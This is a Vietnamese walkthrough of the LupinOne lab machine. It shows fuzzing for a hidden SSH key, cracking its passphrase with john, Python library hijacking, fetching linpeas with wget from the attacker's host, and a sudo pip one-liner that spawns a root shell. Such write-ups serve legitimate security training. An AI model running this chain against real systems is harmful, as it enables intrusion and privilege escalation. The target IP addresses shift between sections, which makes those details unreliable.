# LAB6: LupinOne
## Chuẩn bị
* Kali linux: 192.168.56.102

![image](https://user-images.githubusercontent.com/92532460/224264103-4aa34404-a592-4227-92f8-b7bc6f32c9dc.png)

* Máy victim: Lupinone: 192.56.101

![image](https://user-images.githubusercontent.com/92532460/224264965-f2f015c4-67f4-422a-9458-447121a1bf68.png)
## Quét mạng
* Để bắt đầu, chúng ta phải sử dụng lệnh netdetect để quét mạng để tìm địa chỉ IP của máy nạn nhân.

* Để tiếp tục quá trình này, chúng tôi sẽ khởi chạy Nmap.

```
nmap -sC -sV 192.168.18.36
```
* Trong đó:

  * -sC: chạy các kịch bản script được tích hợp sẵn để quét port và thu thập thông tin hệ thống. Cờ này tương đương với việc sử dụng tất cả các kịch bản script có sẵn.

  * -sV: quét phiên bản dịch vụ của các port mở. Nó sẽ cố gắng xác định phiên bản của các dịch vụ được chạy trên các cổng mạng bằng cách truy vấn các cơ sở dữ liệu phiên bản dịch vụ được lưu trữ trong nmap.

![image](https://user-images.githubusercontent.com/92532460/224265508-f810c15c-e3de-4f20-ba25-bdc75e88efd8.png)
* Chúng tôi có, theo đầu ra nmap:

  * Trên cổng 22 có máy chủ SSH.

  * Một dịch vụ HTTP (Apache Server) chạy trên cổng 80, cũng như một /~myfiles
## Liệt kê
* Chúng ta bắt đầu quy trình liệt kê bằng cách kiểm tra trang HTTP (/~myfiles). Đã phát hiện ra Lỗi 404 có vẻ đáng ngờ.

![image](https://user-images.githubusercontent.com/92532460/224267085-03e1b2b9-a3a6-4391-b06d-92fe58a8e67e.png)

* Chúng tôi đã xem mã nguồn của trang xem và tìm thấy nhận xét “you can do it, keep trying(bạn có thể làm được, hãy tiếp tục cố gắng)

![image](https://user-images.githubusercontent.com/92532460/224267277-ea16c29b-c938-463b-99cb-d56ac97cf129.png)

* Trước tiên clone github ``` seclists ```
```
git clone https://github.com/danielmiessler/SecLists.git 
```
![image](https://user-images.githubusercontent.com/92532460/224269359-2db60c15-c4cb-49cf-b88e-1010a4e0bf70.png)

* Do đó, chúng tôi sử dụng fuzzing để thu được một số thông tin bổ sung từ trường hợp này. Chúng tôi đã sử dụng ffuf và chúng tôi đã nhận được một thư mục ( bí mật )
```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://192.168.18.101/~FUZZ'
```
![image](https://user-images.githubusercontent.com/92532460/224270587-a3503db1-c239-4da1-bd13-3a27ede4151a.png)

* Hãy xem kỹ thư mục bí mật đó và phân tích rằng ở đây tác giả đang chia sẻ một số thông tin liên quan đến tệp khóa riêng SSH liên quan đến người dùng “icex64” mà chúng ta cần fuzz.
![image](https://user-images.githubusercontent.com/92532460/224270945-cc99dd78-0c07-48bf-b3ab-e673001daa2a.png)

* Để tìm khóa ssh riêng bí mật đó, chúng tôi lại sử dụng fuzzing với sự trợ giúp của ffuf một lần nữa và tìm thấy tệp văn bản (mysecret.txt).
```
ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://192.168.56.101/~secret/.FUZZ' -fc 403 -e .txt,.html
```
![image](https://user-images.githubusercontent.com/92532460/224272031-0f636b0a-a391-430b-9189-c6b43412a0c5.png)
* Chúng ta khám phá mysecret.txt bằng trình duyệt web. Nó dường như là một khóa ssh riêng, nhưng nó được mã hóa. Chúng tôi đã kiểm tra kỹ lưỡng khóa này và phát hiện ra rằng nó được mã hóa ở cơ số 58.
``` 
http://192.168.18.36/~secret/.mysecret.txt 
```
![image](https://user-images.githubusercontent.com/92532460/224272215-538c1aa0-6093-4988-b16d-5510842bdd15.png)
* Chúng tôi đã tra cứu trực tuyến bộ giải mã cơ sở 58 và gặp phải trình duyệt. Đây là bộ giải mã base-58 trực tuyến cơ bản nhất dành cho các nhà phát triển và lập trình viên web.

*Chỉ cần nhập dữ liệu của bạn vào biểu mẫu bên dưới, nhấp vào nút Giải mã Base-58 và bạn sẽ thấy một chuỗi được mã hóa base-58. Chúng tôi đã nhận được khóa ssh của mình sau khi giải mã nó.

*Mình sử dụng ``` https://codebeautify.org/base58-decode ``` để giải mã
![image](https://user-images.githubusercontent.com/92532460/224273887-ff67ae1e-4018-488b-9790-5184637f35a6.png)
## Khai thác
* Lưu ssh key vừa decode được vào file ssh_key.rsa
![image](https://user-images.githubusercontent.com/92532460/224275170-f7d827ea-e7c0-47fe-9a00-8e466a63da26.png)

* Vì tác giả đã chia sẻ một số gợi ý liên quan đến cụm mật khẩu cho Khóa SSH, do đó chúng tôi đang sử dụng ssh2john để lấy giá trị băm của khóa ssh.
```
/usr/share/john/ssh2john.py ssh_key.rsa > hash
```
![image](https://user-images.githubusercontent.com/92532460/224275728-6f1c2c51-7e43-4f12-a1cc-48735c0fa551.png)
* Bây giờ, sử dụng john để bẻ khóa giá trị băm.
```
john --wordlist=/usr/share/wordlists/fasttrack.txt hash
```
Thu được mật khẩu là ``` P@55w0rd! ```
* Chúng tôi có tất cả các yêu cầu để đăng nhập ssh. Sử dụng tên người dùng icex64, khóa ssh và mật khẩu đã bẻ khóa của chúng tôi ( P@55w0rd! ).
```
ssh -i sshkey icex64@192.168.56.101
```
![image](https://user-images.githubusercontent.com/92532460/224278410-f3667d6b-7571-4586-97f3-723657a55e84.png)
* Bang!! Chúng tôi đã sử dụng người dùng icex64 để kết nối với ssh. Chúng tôi đã nhanh chóng xác minh quyền truy cập của người dùng này và phát hiện ra rằng một tệp Python đang chạy. Chúng tôi đã nhanh chóng kiểm tra tệp đó và phát hiện ra rằng nó có thể bị khai thác bằng cách sử dụng phương pháp Chiếm quyền điều khiển thư viện Python 
```
sudo -l
cat /home/arsene/heist.py
```
![image](https://user-images.githubusercontent.com/92532460/224279365-a8bb05c4-c513-4f8a-aed0-0b831afd04bc.png)
## Nâng cấp đặc quyền
* Chúng tôi đã bắt đầu quá trình leo thang đặc quyền. Để bắt đầu với kỹ thuật Chiếm đoạt thư viện Python, trước tiên chúng ta phải xác định tọa độ của webbrowser.py. Đó là lý do tại sao chúng tôi đang sử dụng tập lệnh linpeas.

* Trước đây chúng tôi đã tải xuống tập lệnh Linpeas từ trang git. Bây giờ chúng ta chỉ cần điều hướng đến thư mục đó và khởi chạy một máy chủ http Python cơ bản.
```
python -m http.server 80
```
![image](https://user-images.githubusercontent.com/92532460/224280267-300415eb-0472-4a26-89ec-c339122ed9c6.png)
* Bây giờ chúng ta sẽ chuyển sang thiết bị đầu cuối icex64. Chúng tôi đã chuyển thư mục sang thư mục /tmp và nhập tập lệnh Linpeas từ Kali Linux bằng hàm wget.
```
cd /tmp
wget 192.168.1.3/linpeas.sh
```
* Sau đó, chúng tôi đã cấp cho tập lệnh TẤT CẢ các quyền. Sau đó, chúng tôi chạy nó ngay lập tức.
* 
![image](https://user-images.githubusercontent.com/92532460/224280735-3d15eae8-c276-485c-9dc0-170ddb62f5ba.png)

* Chúng tôi đã có được vị trí của tệp Python chỉ trong vài giây ( webbrowser.py ).

![image](https://user-images.githubusercontent.com/92532460/224281039-647615cb-cad6-4c2b-a72a-7992b2c3ef52.png)

* Bây giờ chúng ta có thể bắt đầu quy trình Chiếm quyền điều khiển thư viện Python khi kẻ tấn công được đưa vào môi trường hỗ trợ python
* Để vận hành tệp python này, chúng tôi đã sử dụng lệnh ```nano``` và chỉnh sửa tập lệnh để gọi mã /bin/bash vào đó.
```
os.system ("/bin/bash")
```
![image](https://user-images.githubusercontent.com/92532460/224282135-eeece908-2682-4906-b10f-614a8cec0a03.png)

* Sau tất cả nỗ lực này, chúng tôi đã chạy lệnh sudo kết hợp với tọa độ được chỉ định trong kiểm tra quyền trên icex64. Để chuyển người dùng icex64 sang arsene .
```
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
```
![image](https://user-images.githubusercontent.com/92532460/224282814-d5fc28cd-2f68-43bf-8cd1-380409b62f1d.png)

* Chúng tôi đã sử dụng hướng dẫn gtfobin được cung cấp tại đây để tiến hành leo thang đặc quyền pip. Nếu chương trình được sudo cho phép chạy với tư cách siêu người dùng, thì chương trình sẽ giữ lại các quyền đã nâng cao của mình và có thể được sử dụng để truy cập hệ thống tệp, chuyển cấp hoặc giữ quyền truy cập đặc quyền.

* Để tiến hành leo thang đặc quyền pip, chúng ta chỉ cần chạy ba lệnh này.
```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```
* Cuối cùng, chúng ta có root; chỉ cần sử dụng lệnh id để kiểm tra. Nó đã được chứng minh rằng nó là root; chỉ cần thay đổi thư mục thành root. Công-gô!! Chúng tôi đã lấy được cờ gốc.
![image](https://user-images.githubusercontent.com/92532460/224283382-f81c1b5c-6e06-403b-bf72-6b73e33fb494.png)



